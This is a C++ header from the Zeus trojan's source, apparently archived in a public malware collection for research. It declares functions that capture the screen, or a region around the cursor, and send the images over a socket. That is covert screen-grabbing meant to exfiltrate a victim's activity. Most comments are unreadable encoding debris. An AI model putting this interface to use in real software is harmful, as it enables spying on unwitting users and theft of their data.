/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  �������� ���������.
*/
#pragma once

namespace Screenshoot
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ������ ��������� ������ � IStream.

    IN mimeType - ������ �����������.
    IN quality  - �������� �������� � ��������� (������ JPEG).
    IN rect     - ������ ������� �������� ������ �������, ��� 0 - ��� �������� ��������� �����
                  ������.

    Return      - IStream - � ������ ������,
                  NULL    - � ������ ������.
  */
  IStream *_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect);

  /*    Record screenshots into the socket.

    IN s - socket.
    IN mimeType - the image format.
    IN quality - picture quality in percent (only JPEG).
    IN rect - the size of the square around the cursor, or 0 - to create a screenshot of the
                  screen.

    Return - true - if successful,
                  false - if an error occurs.
  */
  bool _screenToSocket(SOCKET s, LPWSTR mimeType, DWORD quality, WORD rect);
};
